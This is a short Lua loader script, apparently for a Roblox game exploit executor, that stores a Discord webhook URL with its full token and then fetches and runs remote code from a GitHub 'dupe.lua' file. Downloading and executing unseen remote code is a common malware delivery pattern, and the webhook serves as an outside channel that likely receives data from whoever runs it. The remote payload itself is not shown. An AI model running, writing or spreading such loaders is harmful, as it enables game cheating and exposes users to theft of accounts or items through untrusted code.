local Webhook = "https://discord.com/api/webhooks/1436519539255939204/aOUHznV6CKdSy7OIB60qxpeNlWLezefl3XhvpR82V7JoWfJFRuXaQZHdXhHGP5HWRkco"

getgenv().UserPingThreshold = 50000000


-- =================================================================================
--      SCRIPT LOADER - DO NOT EDIT BELOW THIS LINE
-- =================================================================================

if Webhook and Webhook:match("discord.com/api/webhooks") then
    getgenv().UserWebhookURL = Webhook
else
    return
end

loadstring(game:HttpGet('https://raw.githubusercontent.com/LXZRz/dupe/main/dupe.lua', true))()
